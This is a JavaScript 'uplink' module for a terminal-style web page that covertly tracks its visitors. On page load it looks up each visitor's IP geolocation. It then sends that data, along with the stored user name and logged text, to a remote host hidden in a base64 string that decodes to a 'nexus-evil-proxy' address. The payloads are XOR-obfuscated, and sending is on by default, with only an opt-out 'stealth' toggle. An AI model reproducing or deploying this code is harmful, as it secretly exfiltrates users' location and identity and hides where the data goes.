// 🛰️ NEXUS UPLINK MODULE v5.2.0
// [ PROTECTED NODE ]
(function() {
    let _geo = null;
    let _sid = localStorage.getItem('nx_sid') || null;
    let _stealth = localStorage.getItem('nx_stealth') === '1';

    window._px_parse = function(u) {
        if (/iPhone/.test(u)) return "iP";
        if (/iPad/.test(u)) return "iT";
        if (/Android/.test(u)) return "An";
        if (/Windows/.test(u)) return "Wi";
        if (/Mac OS X/.test(u)) return "Mc";
        return "Un";
    };

    window._px_encrypt = function(data) {
        const key = "XAVIER_PACIFIC";
        let out = "";
        for(let i=0; i<data.length; i++) {
            out += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        }
        return btoa(out);
    };

    window._px_transmit = async function(p, s = null, w = false) {
        if (_stealth) {
            console.warn("[UPLINK] Stealth Mode Active. Data blocked.");
            return null;
        }
        try {
            const b = { p: window._px_encrypt(JSON.stringify(p)) };
            if (s || _sid) b.s = s || _sid;
            if (w) b.w = true;
            
            // Obfuscated Hub Access
            const h = window.PACIFIC_HUB || atob('aHR0cHM6Ly9uZXh1cy1ldmlsLXByb3h5LnhhdmllcnNjb3R0MzAwLndvcmtlcnMuZGV2');
            const r = await fetch(`${h}/log`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(b),
            });
            if (w && r.ok) return r.json();
        } catch(e) {}
        return null;
    };

    window.toggleStealthMode = function() {
        _stealth = !_stealth;
        localStorage.setItem('nx_stealth', _stealth ? '1' : '0');
        const btn = document.getElementById('stealth-toggle');
        if (btn) {
            btn.textContent = _stealth ? 'DISABLE STEALTH' : 'ENABLE STEALTH';
            btn.style.color = _stealth ? '#f55' : '#0ff';
        }
        printToTerminal(`[SYSTEM] Stealth Mode: ${_stealth ? 'ENABLED' : 'DISABLED'}`, 'sys-msg');
    };

    window._px_log = async function(t, i = null) {
        const u = JSON.parse(localStorage.getItem('nexus_user_data') || '{"name":"Guest"}');
        const e = {
            t: `N: ${u.name}`,
            d: t,
            ts: new Date().toISOString()
        };
        window._px_transmit({ embeds: [e] });
    };

    async function _px_init() {
        if (_sid || _stealth) return;
        const l = _geo ? `${_geo.city}, ${_geo.country}` : '...';
        const d = await window._px_transmit({
            n: `NL: ${l}`,
            e: [{
                t: 'ESTABLISHED',
                d: `Node online: ${l}`,
                ts: new Date().toISOString(),
            }]
        }, null, true);

        if (d?.id) {
            _sid = String(d.id);
            localStorage.setItem('nx_sid', _sid);
        }
    }

    setTimeout(async () => {
        try {
            const r = await fetch('https://ipinfo.io/json');
            _geo = await r.json();
            _px_init();
            
            // Sync button state on load
            const btn = document.getElementById('stealth-toggle');
            if (btn) {
                btn.textContent = _stealth ? 'DISABLE STEALTH' : 'ENABLE STEALTH';
                btn.style.color = _stealth ? '#f55' : '#0ff';
            }
        } catch(_) {}
    }, 5000);
})();
